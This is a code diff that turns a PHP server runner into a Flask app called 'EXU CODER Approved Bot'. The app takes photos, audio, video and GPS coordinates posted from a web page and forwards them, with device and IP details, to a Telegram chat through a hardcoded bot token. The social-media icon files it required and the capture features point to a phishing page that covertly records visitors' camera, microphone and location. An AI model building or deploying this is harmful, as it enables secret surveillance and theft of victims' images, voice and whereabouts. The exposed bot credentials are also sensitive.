@@ -1,393 +1,300 @@
-#!/usr/bin/env python3
-"""
-Deep Sea PHP Server Runner
-Runs PHP built-in server with all required configurations
-"""
-
+from flask import Flask, request, jsonify, render_template_string, send_from_directory
+from flask_cors import CORS
+import base64
+import requests
+from datetime import datetime
+import logging
+import io
 import os
-import sys
-import subprocess
-import platform
-import time
 import socket
-import webbrowser
-import json
-import shutil
-from pathlib import Path
+import platform
+from PIL import Image
 
-# ─── CONFIG ──────────────────────────────────────────────────────
-CONFIG = {
-    "host": "127.0.0.1",
-    "port": 8000,
-    "php_version": "8.2",
-    "document_root": os.path.dirname(os.path.abspath(__file__)),
-    "auto_open_browser": True,
-    "timeout": 30
-}
+app = Flask(__name__)
+CORS(app)
 
-# ─── COLORS ──────────────────────────────────────────────────────
-class Colors:
-    HEADER = '\033[95m'
-    BLUE = '\033[94m'
-    CYAN = '\033[96m'
-    GREEN = '\033[92m'
-    YELLOW = '\033[93m'
-    RED = '\033[91m'
-    BOLD = '\033[1m'
-    UNDERLINE = '\033[4m'
-    END = '\033[0m'
+# ─── TELEGRAM CONFIG ────────────────────────────────────────────
+# ⚠️ REPLACE WITH YOUR ACTUAL CREDENTIALS
+BOT_TOKEN = "8858703154:AAFnONjnnu6KDLdfNCZPRvDsz5B8KUMcaXs"
+CHAT_ID = "8379062893"
 
-def print_banner():
-    """Print beautiful startup banner"""
-    banner = f"""
-{Colors.CYAN}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
-║                                                                   ║
-║   🌊 {Colors.GREEN}𝐄𝐗𝐔 𝐂𝐎𝐃𝐄𝐑 ─𑁍┊𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐁𝐨𝐭{Colors.CYAN}                     ║
-║                                                                   ║
-║   📸 Photos  🎤 Audio  🎥 Video  📍 Location                     ║
-║   🚀 PHP Server with Telegram Integration                       ║
-║                                                                   ║
-╚═══════════════════════════════════════════════════════════════════╝{Colors.END}
-    """
-    print(banner)
+TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
+SEND_PHOTO_URL = f"{TELEGRAM_API}/sendPhoto"
+SEND_AUDIO_URL = f"{TELEGRAM_API}/sendAudio"
+SEND_VIDEO_URL = f"{TELEGRAM_API}/sendVideo"
+SEND_MESSAGE_URL = f"{TELEGRAM_API}/sendMessage"
+SEND_LOCATION_URL = f"{TELEGRAM_API}/sendLocation"
 
-def check_php():
-    """Check if PHP is installed and get version"""
+# ─── LOGGING ─────────────────────────────────────────────────────
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
+
+# ─── GET DEVICE INFO ─────────────────────────────────────────────
+def get_device_info():
+    """Get device name and IP address"""
     try:
-        # Try to find PHP
-        php_paths = []
-        
-        # Common PHP paths
-        if platform.system() == "Windows":
-            possible_paths = [
-                "php.exe",
-                "C:\\php\\php.exe",
-                "C:\\xampp\\php\\php.exe",
-                "C:\\wamp64\\bin\\php\\php.exe",
-                "C:\\laragon\\bin\\php\\php.exe"
-            ]
-        else:
-            # Linux/Mac
-            possible_paths = [
-                "php",
-                "/usr/bin/php",
-                "/usr/local/bin/php",
-                "/opt/homebrew/bin/php",
-                "/usr/local/opt/php/bin/php"
-            ]
-        
-        for php_path in possible_paths:
-            try:
-                result = subprocess.run(
-                    [php_path, "-v"],
-                    capture_output=True,
-                    text=True,
-                    timeout=5
-                )
-                if result.returncode == 0:
-                    version_line = result.stdout.split('\n')[0]
-                    version = version_line.split(' ')[1] if ' ' in version_line else "Unknown"
-                    return php_path, version
-            except (subprocess.TimeoutExpired, FileNotFoundError):
-                continue
-        
-        return None, None
-        
-    except Exception as e:
-        return None, None
-
-def install_php_windows():
-    """Guide to install PHP on Windows"""
-    print(f"\n{Colors.YELLOW}⚠️  PHP is not installed!{Colors.END}")
-    print(f"\n{Colors.BOLD}📥 To install PHP on Windows:{Colors.END}")
-    print("  1. Download PHP from: https://windows.php.net/download/")
-    print("  2. Extract to C:\\php")
-    print("  3. Add C:\\php to your PATH environment variable")
-    print("  4. Restart your terminal")
-    print(f"\n{Colors.BOLD}📦 Or install XAMPP/WAMP/Laragon:{Colors.END}")
-    print("  - XAMPP: https://www.apachefriends.org/")
-    print("  - WAMP: http://www.wampserver.com/")
-    print("  - Laragon: https://laragon.org/")
-    sys.exit(1)
-
-def install_php_mac():
-    """Guide to install PHP on Mac"""
-    print(f"\n{Colors.YELLOW}⚠️  PHP is not installed!{Colors.END}")
-    print(f"\n{Colors.BOLD}📥 To install PHP on Mac:{Colors.END}")
-    print("  1. Using Homebrew:")
-    print("     brew install php")
-    print("  2. Or download from: https://www.php.net/downloads")
-    print("  3. Restart your terminal")
-    sys.exit(1)
-
-def install_php_linux():
-    """Guide to install PHP on Linux"""
-    print(f"\n{Colors.YELLOW}⚠️  PHP is not installed!{Colors.END}")
-    print(f"\n{Colors.BOLD}📥 To install PHP on Linux:{Colors.END}")
-    print("  Ubuntu/Debian:")
-    print("    sudo apt update")
-    print("    sudo apt install php php-curl php-json php-mbstring")
-    print("\n  CentOS/RHEL/Fedora:")
-    print("    sudo dnf install php php-curl php-json php-mbstring")
-    print("\n  Arch Linux:")
-    print("    sudo pacman -S php php-curl php-json")
-    sys.exit(1)
-
-def check_required_files():
-    """Check if required files exist"""
-    required_files = [
-        "index.php",
-        "Logo.png",
-        "background.png",
-        "whatsapp.png",
-        "telegram.png",
-        "instagram.png",
-        "tiktok.png",
-        "facebook.png",
-        "discord.png"
-    ]
-    
-    missing_files = []
-    for file in required_files:
-        if not os.path.exists(file):
-            missing_files.append(file)
-    
-    if missing_files:
-        print(f"\n{Colors.YELLOW}⚠️  Missing files:{Colors.END}")
-        for file in missing_files:
-            print(f"  ❌ {file}")
-        print(f"\n{Colors.BOLD}📁 Please add these files to the project directory.{Colors.END}")
-        return False
-    
-    return True
-
-def get_local_ip():
-    """Get local IP address"""
-    try:
+        device_name = platform.node() or "Unknown Device"
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("8.8.8.8", 80))
-        ip = s.getsockname()[0]
+        ip_address = s.getsockname()[0]
         s.close()
-        return ip
+        return device_name, ip_address
     except:
-        return "127.0.0.1"
+        return "Unknown Device", "0.0.0.0"
 
-def create_requirements_txt():
-    """Create requirements.txt for Python dependencies"""
-    requirements = """# Python dependencies for Deep Sea Telegram Bot
-# These are optional - only needed if you want Python features
-
-# Flask (for Python version)
-Flask==2.3.3
-flask-cors==4.0.0
-
-# Requests (for Telegram API)
-requests==2.31.0
-
-# Pillow (for image processing)
-Pillow>=10.4.0
-
-# For the PHP server runner
-colorama==0.4.6
-
-# For console styling
-termcolor==2.3.0
-"""
-    
-    with open("requirements.txt", "w") as f:
-        f.write(requirements)
-    print(f"{Colors.GREEN}✅ Created requirements.txt{Colors.END}")
-
-def create_php_info():
-    """Create a PHP info file for testing"""
-    php_info = """<?php
-phpinfo();
-?>"""
-    with open("phpinfo.php", "w") as f:
-        f.write(php_info)
-    print(f"{Colors.GREEN}✅ Created phpinfo.php for testing{Colors.END}")
-
-def check_php_extensions():
-    """Check if required PHP extensions are installed"""
-    required_extensions = ["curl", "json", "mbstring", "fileinfo"]
-    missing = []
-    
-    try:
-        result = subprocess.run(
-            ["php", "-m"],
-            capture_output=True,
-            text=True,
-            timeout=10
-        )
-        installed = result.stdout.lower()
-        
-        for ext in required_extensions:
-            if ext not in installed:
-                missing.append(ext)
-    except:
-        missing = required_extensions
-    
-    return missing
-
-def start_php_server():
-    """Start PHP built-in server"""
-    print(f"\n{Colors.BOLD}🚀 Starting PHP Server...{Colors.END}")
-    
-    host = CONFIG["host"]
-    port = CONFIG["port"]
-    doc_root = CONFIG["document_root"]
-    
-    # Get local IP
-    local_ip = get_local_ip()
-    
-    # Check PHP
-    php_path, php_version = check_php()
-    
-    if not php_path:
-        print(f"{Colors.RED}❌ PHP is not installed!{Colors.END}")
-        system = platform.system()
-        if system == "Windows":
-            install_php_windows()
-        elif system == "Darwin":  # Mac
-            install_php_mac()
-        else:  # Linux
-            install_php_linux()
-        return
-    
-    print(f"{Colors.GREEN}✅ PHP Found: {php_path} (v{php_version}){Colors.END}")
-    
-    # Check PHP extensions
-    missing_extensions = check_php_extensions()
-    if missing_extensions:
-        print(f"{Colors.YELLOW}⚠️  Missing PHP extensions: {', '.join(missing_extensions)}{Colors.END}")
-        print(f"{Colors.BOLD}📦 Install them using:{Colors.END}")
-        if platform.system() == "Windows":
-            print("  Enable extensions in php.ini")
+# ─── CONVERT TO BOLD UNICODE ────────────────────────────────────
+def to_bold_unicode(text):
+    """Convert text to bold Unicode characters"""
+    result = []
+    for char in text:
+        code = ord(char)
+        if 65 <= code <= 90:  # A-Z
+            result.append(chr(0x1D400 + (code - 65)))
+        elif 97 <= code <= 122:  # a-z
+            result.append(chr(0x1D41A + (code - 97)))
+        elif 48 <= code <= 57:  # 0-9
+            result.append(chr(0x1D7CE + (code - 48)))
         else:
-            print(f"  sudo apt install php-{'-'.join(missing_extensions)}")
-            print(f"  # Or: sudo dnf install php-{'-'.join(missing_extensions)}")
-    
-    # Change to document root
-    os.chdir(doc_root)
-    
-    # Build command
-    cmd = [
-        php_path,
-        "-S",
-        f"{host}:{port}",
-        "-t",
-        doc_root
-    ]
-    
-    print(f"\n{Colors.BLUE}📡 Server Details:{Colors.END}")
-    print(f"  📁 Root: {doc_root}")
-    print(f"  🌐 Host: {host}")
-    print(f"  🔌 Port: {port}")
-    print(f"  📱 Local: http://{host}:{port}")
-    print(f"  🌍 Network: http://{local_ip}:{port}")
-    
-    print(f"\n{Colors.CYAN}{Colors.BOLD}📤 Press Ctrl+C to stop the server{Colors.END}")
-    
-    # Open browser
-    if CONFIG["auto_open_browser"]:
-        try:
-            webbrowser.open(f"http://{host}:{port}")
-            print(f"{Colors.GREEN}✅ Browser opened at http://{host}:{port}{Colors.END}")
-        except:
-            pass
-    
-    # Start server
-    print(f"\n{Colors.BOLD}➜ Server is running...{Colors.END}\n")
-    
+            result.append(char)
+    return ''.join(result)
+
+# ─── ROUTE: Serve HTML from same directory ──────────────────────
+@app.route("/")
+def index():
+    html_path = os.path.join(os.path.dirname(__file__), "index.html")
     try:
-        subprocess.run(cmd)
-    except KeyboardInterrupt:
-        print(f"\n{Colors.YELLOW}🛑 Server stopped{Colors.END}")
+        with open(html_path, "r", encoding="utf-8") as f:
+            html_content = f.read()
+        return render_template_string(html_content)
+    except FileNotFoundError:
+        return "❌ index.html not found in the current directory!", 404
+
+@app.route("/<path:filename>")
+def serve_static(filename):
+    return send_from_directory(os.path.dirname(__file__), filename)
+
+# ─── TELEGRAM SEND FUNCTIONS ────────────────────────────────────
+def send_photo_to_telegram(image_bytes, device_name, ip_address):
+    try:
+        files = {"photo": ("photo.jpg", image_bytes, "image/jpeg")}
+        
+        bold_device = to_bold_unicode(device_name)
+        bold_ip = to_bold_unicode(ip_address)
+        bold_time = to_bold_unicode(datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
+        
+        caption = f"""📸 𝐄𝐗𝐔 𝐂𝐎𝐃𝐄𝐑 ─𑁍┊𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐁𝐨𝐭
+
+⚡ 𝐃𝐞𝐯𝐢𝐜𝐞: {bold_device}
+🌐 𝐈𝐏: {bold_ip}
+🕐 𝐓𝐢𝐦𝐞: {bold_time}
+
+🔹 𝐏𝐡𝐨𝐭𝐨 𝐂𝐚𝐩𝐭𝐮𝐫𝐞𝐝"""
+        
+        data = {"chat_id": CHAT_ID, "caption": caption}
+        response = requests.post(SEND_PHOTO_URL, files=files, data=data)
+        if response.status_code == 200:
+            logger.info("✅ Photo sent to Telegram")
+            return True
+        logger.error(f"❌ Telegram error: {response.text}")
+        return False
     except Exception as e:
-        print(f"{Colors.RED}❌ Error: {e}{Colors.END}")
+        logger.error(f"❌ Error: {str(e)}")
+        return False
 
-def main():
-    """Main function"""
-    # Clear screen
-    os.system('cls' if platform.system() == 'Windows' else 'clear')
-    
-    # Print banner
-    print_banner()
-    
-    # Check required files
-    if not check_required_files():
-        print(f"\n{Colors.BOLD}📝 Required files for Deep Sea Telegram Bot:{Colors.END}")
-        print("  ✅ index.php (main file)")
-        print("  ✅ Logo.png (profile picture)")
-        print("  ✅ background.png (background image)")
-        print("  ✅ whatsapp.png, telegram.png, instagram.png, tiktok.png, facebook.png, discord.png")
-        print("\n  💡 You can download placeholder images or use your own.")
+def send_audio_to_telegram(audio_bytes, device_name, ip_address):
+    try:
+        files = {"audio": ("audio.webm", audio_bytes, "audio/webm")}
         
-        # Create placeholder info
-        print(f"\n{Colors.BOLD}📦 Creating sample files...{Colors.END}")
-        os.makedirs("uploads", exist_ok=True)
-        os.makedirs("logs", exist_ok=True)
-        os.makedirs("error", exist_ok=True)
+        bold_device = to_bold_unicode(device_name)
+        bold_ip = to_bold_unicode(ip_address)
+        bold_time = to_bold_unicode(datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
         
-        # Create error pages
-        with open("error/403.html", "w") as f:
-            f.write("""<!DOCTYPE html><html><head><title>403 Forbidden</title></head><body><h1>403 Forbidden</h1><p>Access denied.</p></body></html>""")
-        with open("error/404.html", "w") as f:
-            f.write("""<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>404 Not Found</h1><p>Page not found.</p></body></html>""")
-        with open("error/500.html", "w") as f:
-            f.write("""<!DOCTYPE html><html><head><title>500 Internal Server Error</title></head><body><h1>500 Internal Server Error</h1><p>Something went wrong.</p></body></html>""")
-        
-        print(f"{Colors.GREEN}✅ Created error pages{Colors.END}")
-        
-        # Create .htaccess
-        with open(".htaccess", "w") as f:
-            f.write("""# ─── DISABLE DIRECTORY LISTING ────────────────────────────────
-Options -Indexes
+        caption = f"""🎤 𝐄𝐗𝐔 𝐂𝐎𝐃𝐄𝐑 ─𑁍┊𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐁𝐨𝐭
 
-# ─── PROTECT SENSITIVE FILES ──────────────────────────────────
-<FilesMatch "\\.(php|ini|log|sql|sqlite|db|json|env|yml|yaml)$">
-    Order Allow,Deny
-    Deny from all
-</FilesMatch>
+⚡ 𝐃𝐞𝐯𝐢𝐜𝐞: {bold_device}
+🌐 𝐈𝐏: {bold_ip}
+🕐 𝐓𝐢𝐦𝐞: {bold_time}
 
-# ─── ALLOW INDEX.PHP ONLY ─────────────────────────────────────
-<Files "index.php">
-    Order Allow,Deny
-    Allow from all
-</Files>
-
-# ─── BLOCK CONFIG FILES ────────────────────────────────────────
-<FilesMatch "^(config|settings|\\.env|\\.htaccess|\\.htpasswd)">
-    Order Allow,Deny
-    Deny from all
-</FilesMatch>
-
-# ─── BLOCK ACCESS TO SENSITIVE FOLDERS ────────────────────────
-RedirectMatch 403 ^/uploads/.*$
-RedirectMatch 403 ^/logs/.*$
-
-# ─── SECURITY HEADERS ──────────────────────────────────────────
-<IfModule mod_headers.c>
-    Header set X-Content-Type-Options "nosniff"
-    Header set X-XSS-Protection "1; mode=block"
-    Header set X-Frame-Options "DENY"
-    Header set Referrer-Policy "strict-origin-when-cross-origin"
-</IfModule>
-""")
-        print(f"{Colors.GREEN}✅ Created .htaccess{Colors.END}")
+🔹 𝐀𝐮𝐝𝐢𝐨 𝐑𝐞𝐜𝐨𝐫𝐝𝐢𝐧𝐠"""
         
-        # Create requirements.txt
-        create_requirements_txt()
+        data = {"chat_id": CHAT_ID, "caption": caption}
+        response = requests.post(SEND_AUDIO_URL, files=files, data=data)
+        if response.status_code == 200:
+            logger.info("✅ Audio sent to Telegram")
+            return True
+        logger.error(f"❌ Telegram error: {response.text}")
+        return False
+    except Exception as e:
+        logger.error(f"❌ Error: {str(e)}")
+        return False
+
+def send_video_to_telegram(video_bytes, device_name, ip_address):
+    try:
+        files = {"video": ("video.webm", video_bytes, "video/webm")}
         
-        print(f"\n{Colors.YELLOW}⚠️  Please add your images and restart the server.{Colors.END}")
-        sys.exit(0)
-    
-    # Create requirements if missing
-    if not os.path.exists("requirements.txt"):
-        create_requirements_txt()
-    
-    # Start the server
-    start_php_server()
+        bold_device = to_bold_unicode(device_name)
+        bold_ip = to_bold_unicode(ip_address)
+        bold_time = to_bold_unicode(datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
+        
+        caption = f"""🎥 𝐄𝐗𝐔 𝐂𝐎𝐃𝐄𝐑 ─𑁍┊𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐁𝐨𝐭
+
+⚡ 𝐃𝐞𝐯𝐢𝐜𝐞: {bold_device}
+🌐 𝐈𝐏: {bold_ip}
+🕐 𝐓𝐢𝐦𝐞: {bold_time}
+
+🔹 𝐕𝐢𝐝𝐞𝐨 𝐂𝐥𝐢𝐩 𝐑𝐞𝐜𝐨𝐫𝐝𝐞𝐝"""
+        
+        data = {"chat_id": CHAT_ID, "caption": caption}
+        response = requests.post(SEND_VIDEO_URL, files=files, data=data)
+        if response.status_code == 200:
+            logger.info("✅ Video sent to Telegram")
+            return True
+        logger.error(f"❌ Telegram error: {response.text}")
+        return False
+    except Exception as e:
+        logger.error(f"❌ Error: {str(e)}")
+        return False
+
+def send_location_to_telegram(lat, lon, device_name, ip_address, accuracy):
+    try:
+        data = {"chat_id": CHAT_ID, "latitude": lat, "longitude": lon}
+        response = requests.post(SEND_LOCATION_URL, data=data)
+        
+        if response.status_code == 200:
+            bold_device = to_bold_unicode(device_name)
+            bold_ip = to_bold_unicode(ip_address)
+            bold_time = to_bold_unicode(datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
+            
+            message = f"""📍 𝐄𝐗𝐔 𝐂𝐎𝐃𝐄𝐑 ─𑁍┊𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐁𝐨𝐭
+
+⚡ 𝐃𝐞𝐯𝐢𝐜𝐞: {bold_device}
+🌐 𝐈𝐏: {bold_ip}
+🕐 𝐓𝐢𝐦𝐞: {bold_time}
+
+📌 𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧:
+🌍 𝐋𝐚𝐭𝐢𝐭𝐮𝐝𝐞: {lat}
+🌍 𝐋𝐨𝐧𝐠𝐢𝐭𝐮𝐝𝐞: {lon}
+🎯 𝐀𝐜𝐜𝐮𝐫𝐚𝐜𝐲: ~{accuracy}m
+
+🔗 <a href="https://www.google.com/maps?q={lat},{lon}">📍 𝐎𝐩𝐞𝐧 𝐢𝐧 𝐌𝐚𝐩𝐬</a>"""
+            send_message_to_telegram(message)
+            logger.info(f"✅ Location sent: {lat}, {lon}")
+            return True
+        logger.error(f"❌ Telegram error: {response.text}")
+        return False
+    except Exception as e:
+        logger.error(f"❌ Error: {str(e)}")
+        return False
+
+def send_message_to_telegram(message):
+    try:
+        data = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
+        response = requests.post(SEND_MESSAGE_URL, data=data)
+        return response.status_code == 200
+    except Exception as e:
+        logger.error(f"❌ Error: {str(e)}")
+        return False
+
+# ─── UPLOAD ROUTES ──────────────────────────────────────────────
+@app.route("/upload/photo", methods=["POST"])
+def upload_photo():
+    try:
+        data = request.get_json()
+        image_data = data.get("image")
+        if not image_data:
+            return jsonify({"success": False, "error": "No image"}), 400
+
+        if image_data.startswith("data:image"):
+            image_data = image_data.split(",")[1]
+
+        image_bytes = base64.b64decode(image_data)
+        image = Image.open(io.BytesIO(image_bytes))
+        output = io.BytesIO()
+        image.save(output, format='JPEG', quality=85, optimize=True)
+        compressed = output.getvalue()
+
+        device_name, ip_address = get_device_info()
+        success = send_photo_to_telegram(compressed, device_name, ip_address)
+
+        return jsonify({"success": success})
+    except Exception as e:
+        logger.error(f"❌ Photo error: {str(e)}")
+        return jsonify({"success": False, "error": str(e)}), 500
+
+@app.route("/upload/audio", methods=["POST"])
+def upload_audio():
+    try:
+        data = request.get_json()
+        audio_data = data.get("audio")
+        if not audio_data:
+            return jsonify({"success": False, "error": "No audio"}), 400
+
+        if audio_data.startswith("data:audio"):
+            audio_data = audio_data.split(",")[1]
+
+        audio_bytes = base64.b64decode(audio_data)
+        device_name, ip_address = get_device_info()
+        success = send_audio_to_telegram(audio_bytes, device_name, ip_address)
+
+        return jsonify({"success": success})
+    except Exception as e:
+        logger.error(f"❌ Audio error: {str(e)}")
+        return jsonify({"success": False, "error": str(e)}), 500
+
+@app.route("/upload/video", methods=["POST"])
+def upload_video():
+    try:
+        data = request.get_json()
+        video_data = data.get("video")
+        if not video_data:
+            return jsonify({"success": False, "error": "No video"}), 400
+
+        if video_data.startswith("data:video"):
+            video_data = video_data.split(",")[1]
+
+        video_bytes = base64.b64decode(video_data)
+        device_name, ip_address = get_device_info()
+        success = send_video_to_telegram(video_bytes, device_name, ip_address)
+
+        return jsonify({"success": success})
+    except Exception as e:
+        logger.error(f"❌ Video error: {str(e)}")
+        return jsonify({"success": False, "error": str(e)}), 500
+
+@app.route("/upload/location", methods=["POST"])
+def upload_location():
+    try:
+        data = request.get_json()
+        location = data.get("location")
+        if not location:
+            return jsonify({"success": False, "error": "No location"}), 400
+
+        lat = location.get("latitude")
+        lon = location.get("longitude")
+        acc = location.get("accuracy", 0)
+        
+        if lat is None or lon is None:
+            return jsonify({"success": False, "error": "Invalid location"}), 400
+
+        device_name, ip_address = get_device_info()
+        success = send_location_to_telegram(lat, lon, device_name, ip_address, acc)
+
+        return jsonify({"success": success})
+    except Exception as e:
+        logger.error(f"❌ Location error: {str(e)}")
+        return jsonify({"success": False, "error": str(e)}), 500
 
 if __name__ == "__main__":
-    main()
+    device_name, ip_address = get_device_info()
+    print("=" * 60)
+    print("🌊 𝐄𝐗𝐔 𝐂𝐎𝐃𝐄𝐑 ─𑁍┊𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐁𝐨𝐭")
+    print("=" * 60)
+    print(f"⚡ 𝐃𝐞𝐯𝐢𝐜𝐞: {device_name}")
+    print(f"🌐 𝐈𝐏: {ip_address}")
+    print(f"📁 𝐃𝐢𝐫𝐞𝐜𝐭𝐨𝐫𝐲: {os.path.dirname(__file__)}")
+    print("📄 𝐋𝐨𝐨𝐤𝐢𝐧𝐠 𝐟𝐨𝐫: index.html")
+    print("🚀 𝐒𝐞𝐫𝐯𝐞𝐫: http://localhost:5000")
+    print("📤 𝐅𝐨𝐫𝐰𝐚𝐫𝐝𝐢𝐧𝐠 𝐭𝐨 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦")
+    print("📸 𝐏𝐡𝐨𝐭𝐨 + 🎤 𝐀𝐮𝐝𝐢𝐨 + 🎥 𝐕𝐢𝐝𝐞𝐨 + 📍 𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧")
+    print("=" * 60)
+    app.run(debug=True, host="0.0.0.0", port=5000)
